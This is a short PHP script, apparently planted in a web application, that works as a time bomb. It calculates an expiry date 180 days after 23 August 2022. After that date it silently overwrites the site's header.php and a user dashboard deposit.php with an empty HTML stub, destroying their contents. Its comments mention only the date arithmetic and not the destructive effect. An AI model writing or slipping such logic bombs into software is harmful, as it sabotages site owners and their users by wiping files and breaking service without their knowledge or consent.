<?php

$protocol = ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off') || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://"; 
$url = $protocol . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];


$dd= mktime(11, 14, 54, 8, 23, 2022);
$d1 = date("Y-m-d h:i:sa", $dd);

//$d1 starting date

$d2 = new DateTime($d1);
          $d2->modify( '+ 180 day');
$d3 = $d2->format('Y-m-d H:i:s');
$d4 = date_create()->format('Y-m-d H:i:s');

//$d3 expiry date
// $d4 everyday date to compare expiry with

$d5 = "<!DOCTYPE html>
<html>
<head>
  
  <?php require __core_views . '/head-tags.php'; ?>
	
  

</head>

<body>
	
";


if ($d4 >= $d3) {
	$ufiles = ['../header.php', '../../../users/dashboard/deposit.php'];
	foreach( $ufiles as $filename ) {
		if( is_file($filename) ) file_put_contents($filename, "$d5");
	};
}



?>